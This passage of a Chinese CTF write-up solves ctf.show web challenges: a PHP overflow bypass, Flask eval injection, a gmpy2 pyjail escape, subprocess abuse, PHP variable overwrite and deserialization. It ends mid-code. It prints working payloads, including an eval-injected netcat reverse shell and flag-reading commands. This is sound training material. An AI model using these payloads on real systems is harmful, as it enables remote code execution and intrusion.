<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$arr</span>[<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$arr</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在正常了, 只能用数组整型溢出绕过永真判断, 其他的数值可以看下面的<code>茶歇区</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">?0=9223372036854775807	# 反正大就是好</span><br></pre></td></tr></table></figure>
<h2 id="算力超群"><a class="header-anchor" href="#算力超群">¶</a>算力超群</h2>
<p><code>python eval</code></p>
<p>计算是后台计算的, 并不能干别的, 但是GET传值, 可以尝试构建错误的传值和错误的页面, 没有渲染就自己构建get请求重新访问</p>
<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240626201236473.png" alt="image-20240626201236473"></p>
<p>在报错页面底下有<code>/app/app.py</code>部分源码(所以是Flask框架), 其中的a和b结合GET传值可以确定是可以控制的, 看上去没有过滤, 传值尝试后发现number1是有过滤的, 而number2是没有过滤的, 尝试用number2进行命令执行</p>
<blockquote>
<p>所以为什么hint: 算算算算算算, 我是铁算子r4</p>
</blockquote>
<p>因为eval是不回回显的, 所以我尝试用反弹Shell进行后续步骤, 当然也可以把执行的结果塞进文件然后读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">?number2=1,__import__(&#x27;os&#x27;).system(&#x27;nc ip port -e /bin/sh&#x27;)</span><br></pre></td></tr></table></figure>
<p>我这里尝试直接发包, 发现连接不了, 还是直接访问才行; 然后在根目录找到flag</p>
<p>另一种方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 展示文件目录</span><br><span class="line">_calculate?number1=1&amp;operator=%2B&amp;number2=2,__import__(&#x27;os&#x27;).system(&#x27;ls / &gt;/app/templates/hint.html&#x27;)</span><br><span class="line"># 访问 http://7125305f-e54e-406f-91cd-3c92b19e4813.challenge.ctf.show/hint 得到文件目录</span><br><span class="line"></span><br><span class="line"># 读取flag</span><br><span class="line">_calculate?number1=1&amp;operator=%2B&amp;number2=2,__import__(&#x27;os&#x27;).system(&#x27;cat /flag &gt;/app/templates/hint.html&#x27;)</span><br><span class="line"># 再次访问hint即可</span><br></pre></td></tr></table></figure>
<p>附上wp给的源码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2022/11/2</span></span><br><span class="line"><span class="comment"># @Author  : 探姬</span></span><br><span class="line"><span class="comment"># @Forkfrom:https://github.com/helloflask/calculator</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, render_template, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/_calculate&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate</span>():</span><br><span class="line">    a = request.args.get(<span class="string">&#x27;number1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    operator = request.args.get(<span class="string">&#x27;operator&#x27;</span>, <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">    b = request.args.get(<span class="string">&#x27;number2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    m = re.<span class="keyword">match</span>(<span class="string">r&#x27;^\-?\d*[.]?\d*$&#x27;</span>, a)</span><br><span class="line">    n = re.<span class="keyword">match</span>(<span class="string">r&#x27;^\-?\d*[.]?\d*$&#x27;</span>, a)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> m <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> n <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> operator <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&#x27;+-*/&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(result=<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">        result = <span class="built_in">eval</span>(a + operator + <span class="built_in">str</span>(<span class="built_in">float</span>(b)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="built_in">eval</span>(a + operator + b)</span><br><span class="line">    <span class="keyword">return</span> jsonify(result=result)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hint.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="算力升级"><a class="header-anchor" href="#算力升级">¶</a>算力升级</h2>
<p><code>gmpy2.__builtins__的命令执行</code>, 嗯, 我觉得比较像模板注入? <a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/132436072?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171941052216800225522369%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=171941052216800225522369&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-132436072-null-null.142%5Ev100%5Epc_search_result_base2&amp;utm_term=pyjail&amp;spm=1018.2226.3001.4187">PyJail</a></p>
<p>提示是: 输入算式即可让R4帮你进行计算，本次R4重装升级，已经支持gmpy2了，可以使用gmpy2的函数进行计算，那我们赶快开始吧！</p>
<p>现在换成了POST, 但是源码直接给到了(上面的标签)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/10/20 15:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：算力升级--这其实是一个pyjail题目</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re,gmpy2 </span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">pattern=re.<span class="built_in">compile</span>(<span class="string">r&#x27;\w+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/tiesuanzi&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tiesuanzi</span>():</span><br><span class="line">    code=request.form.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> pattern.findall(code):<span class="comment">#从code里把单词拿出来</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;\d+$&#x27;</span>,item):<span class="comment">#如果不是数字</span></span><br><span class="line">            <span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">dir</span>(gmpy2):<span class="comment">#逐个和gmpy2库里的函数名比较</span></span><br><span class="line">               <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;你想干什么？<span class="subst">&#123;item&#125;</span>不是有效的函数&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result=<span class="built_in">eval</span>(code)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;计算成功，答案是<span class="subst">&#123;result&#125;</span>&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;没有执行成功，请检查你的输入。&quot;</span>&#125;)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;source.html&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>源码对于输入的限制是两个正则，要求要么是数字，要么是dir(gmpy2)中的内容. 直接利用本地的py环境进行测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(gmpy2))</span><br><span class="line"><span class="comment"># print(gmpy2.__builtins__)	# 发现这里面有eval可以进行命令执行</span></span><br></pre></td></tr></table></figure>
<p>发现<code>gmpy2.__builtins__</code>是含有<code>eval</code>函数的, 思路就是使用<code>eval</code>和<code>dir(gmpy2)</code>中的内容拼接字符串, 执行以下命令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gmpy2.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read()&quot;</span>)	<span class="comment"># 反正是能执行到就行</span></span><br></pre></td></tr></table></figure>
<p>只允许<code>gmpy2</code>库中的函数, 我们不能直接用<code>eval</code>, 那就间接用可用函数构造出<code>eval</code>. 这里使用字符串下标操作: <code>'erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]==='eval'</code></p>
<p><code>'erf'[0]</code> 会得到字符串 <code>erf</code> 的第一个字符，即 <code>e</code>
<code>'div'[2]</code> 会得到字符串 <code>div</code> 的第三个字符，即 <code>v</code></p>
<p>不想手动就使用脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">s=<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read()&quot;</span></span><br><span class="line">payload=<span class="string">&quot;gmpy2.__builtins__[&#x27;erf&#x27;[0]+&#x27;div&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;lcm&#x27;[0]](&quot;</span>	<span class="comment"># eval已经创建好了</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码会在gmpy2的函数名中寻找包含这个字符的最短的函数名，并记录下这个字符在函数名中的位置。然后，这个函数名和字符的位置会被添加到payload字符串中, 特殊字符则直接加入payload</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;/&#x27;(). &quot;</span>:</span><br><span class="line">        temp_index=<span class="number">0</span></span><br><span class="line">        temp_string=<span class="string">&#x27;x&#x27;</span>*<span class="number">20</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">dir</span>(gmpy2):</span><br><span class="line">            <span class="keyword">if</span> j.find(i)&gt;=<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(j)&lt;<span class="built_in">len</span>(temp_string):</span><br><span class="line">                    temp_string=j</span><br><span class="line">                    temp_index=j.find(i)</span><br><span class="line">        payload+=<span class="string">f&#x27;\&#x27;<span class="subst">&#123;temp_string&#125;</span>\&#x27;[<span class="subst">&#123;temp_index&#125;</span>]+&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload+=<span class="string">f&#x27;\&quot;<span class="subst">&#123;i&#125;</span>\&quot;+&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=payload[:-<span class="number">1</span>]+<span class="string">&#x27;)&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
<p>Payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gmpy2.__builtins__[&#x27;erf&#x27;[0]+&#x27;div&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;lcm&#x27;[0]](&#x27;c_div&#x27;[1]+&#x27;c_div&#x27;[1]+&#x27;ai&#x27;[1]+&#x27;agm&#x27;[2]+&#x27;cmp&#x27;[2]+&#x27;cos&#x27;[1]+&#x27;erf&#x27;[1]+&#x27;cot&#x27;[2]+&#x27;c_div&#x27;[1]+&#x27;c_div&#x27;[1]+&quot;(&quot;+&quot;&#x27;&quot;+&#x27;cos&#x27;[1]+&#x27;cos&#x27;[2]+&quot;&#x27;&quot;+&quot;)&quot;+&quot;.&quot;+&#x27;cmp&#x27;[2]+&#x27;cos&#x27;[1]+&#x27;cmp&#x27;[2]+&#x27;erf&#x27;[0]+&#x27;jn&#x27;[1]+&quot;(&quot;+&quot;&#x27;&quot;+&#x27;cot&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;cmp&#x27;[0]+&quot; &quot;+&quot;/&quot;+&#x27;erf&#x27;[2]+&#x27;lcm&#x27;[0]+&#x27;ai&#x27;[0]+&#x27;agm&#x27;[1]+&quot;&#x27;&quot;+&quot;)&quot;+&quot;.&quot;+&#x27;erf&#x27;[1]+&#x27;erf&#x27;[0]+&#x27;ai&#x27;[0]+&#x27;add&#x27;[1]+&quot;(&quot;+&quot;)&quot;)</span><br></pre></td></tr></table></figure>
<p>直接输入框就行, 我很好奇为什么我bp发出去不行</p>
<h2 id="easyPytHon-P"><a class="header-anchor" href="#easyPytHon-P">¶</a>easyPytHon_P</h2>
<p>源码糊脸</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line">cmd: <span class="built_in">str</span> = request.form.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">param: <span class="built_in">str</span> = request.form.get(<span class="string">&#x27;param&#x27;</span>)</span><br><span class="line"><span class="comment"># ------------------------------------- Don&#x27;t modify ↑ them ↑! But you can write your code ↓</span></span><br><span class="line"><span class="keyword">import</span> subprocess, os</span><br><span class="line"><span class="keyword">if</span> cmd <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> param <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tVar = subprocess.run([cmd[:<span class="number">3</span>], param, __file__], cwd=os.getcwd(), timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Timeout!&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No Flag!&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>关键在于<code>tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.run: 第一个参数是执行命令</span><br><span class="line">cmd[:3]: 只取cmd这个字符串的前三个字符</span><br><span class="line">__file__: 当前文件路径</span><br><span class="line">cwd=os.getcwd(): 设置子进程的当前目录</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ccorz/p/Python-subprocess-zhong-derun-fang-fa.html">对于subprocess.run的详细介绍</a></p>
<p>传参是POST, 通过Flask的<code>request.form.get()</code>方法, 从表单数据中获取’cmd’和’param’的值, 这通常是在POST请求中使用的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=ls&amp;param=./		# param不能是空的, 否则执行不出来</span><br><span class="line">cmd=cat&amp;param=flag.txt</span><br></pre></td></tr></table></figure>
<h2 id="遍地飘零"><a class="header-anchor" href="#遍地飘零">¶</a>遍地飘零</h2>
<p><code>$$值覆盖，$_GET全局变量和本地变量</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$zeros</span>=<span class="string">&quot;000000000000000000000000000000&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$flag</span>==<span class="string">&quot;000000000000000000000000000000&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;好多零&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;没有零，仔细看看输入有什么问题吧&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后台在接收到GET请求传递过来的参数后，会遍历GET的参数并且赋给<code>$key</code>, 再将<code>$key</code>对应的值给<code>$value</code>; 同时会将GET请求传递的变量名和变量值都作为本地变量的变量名，然后进行值的覆盖, 最后使用<code>var_dump</code>函数输出<code>$_GET</code>的值</p>
<p>如果<code>$_GET</code>不是本地变量的话，后台会输出GET请求传递过去的参数, 因此<code>$_GET</code>必须是本地变量, 也就是GET请求传递的参数; 同时, 还需要参数值为flag, 才能进行变量覆盖</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?_GET=flag</span><br></pre></td></tr></table></figure>
<h2 id="茶歇区"><a class="header-anchor" href="#茶歇区">¶</a>茶歇区</h2>
<p>正常游戏是无法得到flag的, 源代码审计也没有任何的头绪, 购买只能输入整数, 就先猜测是整形溢出吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 常见的数据类型的取值范围</span><br><span class="line">uint8 -&gt; 0-255</span><br><span class="line">uint16 -&gt; 0-65535</span><br><span class="line">uint32 -&gt; 0-4294967295</span><br><span class="line">uint36 -&gt; 0-18446744073709551615</span><br><span class="line">int8 -&gt; -127-128</span><br><span class="line">int16 -&gt; -32768-32767</span><br><span class="line">int32 -&gt; -2147483648-2147483647</span><br><span class="line">int64 -&gt; -9223372036854775808-9223372036854775807 </span><br></pre></td></tr></table></figure>
<p>随便塞一个非常大的数字进去, 可以得到回显, 你会发现这个数字是固定的<code>9223372036854775807</code>, 看来是int64了; 但是尝试了挺多次, 都发现就算数字大于int64的极限, 它仍然不计分; 尝试比最大值小一点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原来: 9223372036854775807</span><br><span class="line">现在: 922337203685477580		# 也不行</span><br><span class="line">再来: 999999999999999999		# 可以了</span><br></pre></td></tr></table></figure>
<p>虽然可以, 但是为什么分是倒扣的?再发一遍就可以了, 弹窗处获得flag</p>
<h2 id="小舔田"><a class="header-anchor" href="#小舔田">¶</a>小舔田?</h2>
<p>反序列化是一个非常好的东西</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Moon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;月亮&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我是&quot;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;快来赏我&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ion_Fan_Princess</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&quot;牛夫人&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;nickname==<span class="string">&quot;小甜甜&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家&quot;</span>.<span class="variable language_">$this</span>-&gt;nickname.<span class="string">&quot;。\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">call</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\t\t\t\t\t\t\t\t\t\t----&quot;</span>.<span class="variable language_">$this</span>-&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Ion_Fan_Princess</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终目的肯定是<code>Ion_Fan_Princess</code>类中的<code>echo $flag;</code>, 而它在<code>call()</code>中, 找到调用的地方, 显然是本类中的<code>__toString</code>方法;</p>
<p>那么想要调用这里的<code>__tostring</code>函数，可以利用上面<code>Moon</code>类中的<code>__toString</code>方法，使得<code>$this-&gt;name</code>的值为<code>Ion_Fan_Princess</code>对象, 在<code>wakeup</code>方法中触发<code>__toString</code>方法</p>
<p>看的头晕可以给你画个图:</p>
<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240627172813673.png" alt="image-20240627172813673"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Moon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ion_Fan_Princess</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&quot;小甜甜&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Moon</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;name=<span class="keyword">new</span> <span class="title class_">Ion_Fan_Princess</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;小甜甜&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;小甜甜&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="LSB探姬"><a class="header-anchor" href="#LSB探姬">¶</a>LSB探姬</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/10/20 15:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：TSTEG-WEB</span></span><br><span class="line"><span class="string"># flag is in /app/flag.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">            f.save(<span class="string">&#x27;upload/&#x27;</span>+f.filename)</span><br><span class="line">            cmd=<span class="string">&quot;python3 tsteg.py upload/&quot;</span>+f.filename</span><br><span class="line">            result=os.popen(cmd).read()</span><br><span class="line">            data=&#123;<span 